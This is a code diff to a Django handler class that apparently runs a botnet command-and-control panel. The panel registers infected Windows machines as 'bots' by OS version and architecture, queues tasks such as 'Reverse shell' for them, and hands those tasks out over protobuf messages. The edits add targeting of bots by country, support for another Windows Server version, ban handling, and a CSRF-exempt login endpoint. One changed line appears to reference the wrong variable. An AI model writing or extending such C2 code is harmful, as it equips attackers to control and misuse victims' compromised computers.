@@ -208,7 +208,7 @@ class Handlers:
 
         if not request.user.check_password(old):
             print('ok')
-            return HttpResponse('')
+            return JsonResponse({})
 
         request.user.set_password(new)
         request.user.save()
@@ -237,6 +237,7 @@ class Handlers:
         return JsonResponse({'v': '200'})
 
     @staticmethod
+    @csrf_exempt
     def login_handler(request) -> HttpResponse or JsonResponse:
         username = request.POST['login']
 
@@ -392,7 +393,7 @@ class Handlers:
                 tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
                                                                  task.xoc == 'x32_64') and (
                                  task.winos == 'all_win' or task_win in task.winos.split(
-                             ':')) and task.personal is False and not task.completed]
+                             ':')) and task.personal is False and not task.completed and (_bot.country == task.country if task.country != '*' else True)]
 
                 for task in tasks:
                     _bot.tasks.add(task)
@@ -402,7 +403,7 @@ class Handlers:
                 res = PanelMsg.RegistrationResult()
                 res.result = True
                 res.dummy = False
-                print(res.SerializeToString())
+
                 return HttpResponse(res.SerializeToString())
 
             except Exception as e:
@@ -412,7 +413,6 @@ class Handlers:
                 res.result = False
                 res.dummy = True
 
-                print(res.SerializeToString())
                 return HttpResponse(res.SerializeToString())
 
         elif msg_type == 2:
@@ -429,12 +429,17 @@ class Handlers:
                 'Reverse shell': 1
             }
 
+            if bot.is_banned:
+                giveaway = PanelMsg.TaskGiveaway()
+                giveaway.is_empty = True
+                return HttpResponse(giveaway.SerializeToString())
+
             if len(bot.tasks.all()) == 0:
                 giveaway = PanelMsg.TaskGiveaway()
                 giveaway.is_empty = True
                 return HttpResponse(giveaway.SerializeToString())
 
-            task = bot.tasks.all()[0]
+            task = bot.tasks.all()[len(bot.tasks.all()) - 1]
 
             giveaway = PanelMsg.TaskGiveaway()
             giveaway.is_empty = False
@@ -465,7 +470,7 @@ class Handlers:
                     _task.completed = True
                     _task.save()
                     bots = Bot.objects.filter(tasks=_task)
-                    print(bots, 'task1')
+
                     for bot in bots:
                         bot.tasks.remove(_task)
                 elif _task.done > _task.repetitions:
@@ -473,11 +478,11 @@ class Handlers:
                     _task.completed = True
                     _task.save()
                     bots = Bot.objects.filter(tasks=_task)
-                    print(bots, 'task2')
+
                     for bot in bots:
                         bot.tasks.remove(_task)
                 else:
-                    bot = Bot.objects.get(uid=_task.uid.decode('utf-16-le'))
+                    bot = Bot.objects.get(uid=task.uid.decode('utf-16-le'))
                     bot.tasks.remove(_task)
                     bot.save()
                     _task.save()
@@ -498,8 +503,6 @@ class Handlers:
         bot = Bot.objects.get(uid=request.POST['uid'])
         bot.is_banned = True
         bot.save()
-        for task in bot.tasks.all():
-            bot.tasks.remove(task)
         return JsonResponse({'v': '200'})
 
     @staticmethod
@@ -507,32 +510,6 @@ class Handlers:
     def unban(request) -> JsonResponse:
         bot = Bot.objects.get(uid=request.POST['uid'])
         bot.is_banned = False
-
-        if bot.is_x64:
-            xoc = 'x64'
-        else:
-            xoc = 'x32'
-
-        if bot.is_win81:
-            task_win = 'win81'
-        elif bot.is_win7:
-            task_win = 'win7'
-        elif bot.is_win10:
-            task_win = 'win10_11'
-        elif bot.is_win8:
-            task_win = 'win8'
-        elif bot.is_server2016_19:
-            task_win = 'serv2016_19'
-        elif bot.is_server2012:
-            task_win = 'serv2012'
-
-        tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
-                                                         task.xoc == 'x32_64') and (
-                         task.winos == 'all_win' or task_win in task.winos.split(
-                     ':')) and task.personal is False and not task.completed]
-
-        for task in tasks:
-            bot.tasks.add(task)
 
         bot.save()
 
@@ -558,6 +535,7 @@ class Handlers:
             'win10_11': Bot.objects.filter(is_win10=True).filter(is_banned=False),
             'serv2016_19': Bot.objects.filter(is_server2016_19=True).filter(is_banned=False),
             'serv2012': Bot.objects.filter(is_server2012=True).filter(is_banned=False),
+            'serv2012r2': Bot.objects.filter(is_server2012r2=True).filter(is_banned=False),
             'all_win': Bot.objects.filter(is_banned=False)
         }
 
@@ -566,10 +544,10 @@ class Handlers:
         bots = [s[win] for win in wins if len(s[win]) != 0]
         try:
             if 'x32_64' in x_oc:
-                _bots = [bot for bot in bots[0] if bot.is_banned is False]
+                _bots = [bot for bot in bots[0] if bot.is_banned is False and (bot.country == country if country != '*' else True)]
             else:
                 _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
-                         is False]
+                         is False and (bot.country == country if country != '*' else True)]
         except:
             _bots = []
 
@@ -619,6 +597,8 @@ class Handlers:
             task_win = 'serv2016_19'
         elif _bot.is_server2012:
             task_win = 'serv2012'
+        elif _bot.is_server2012r2:
+            task_win = 'serv2012r2'
 
         if _bot.is_x64:
             xoc = 'x64'
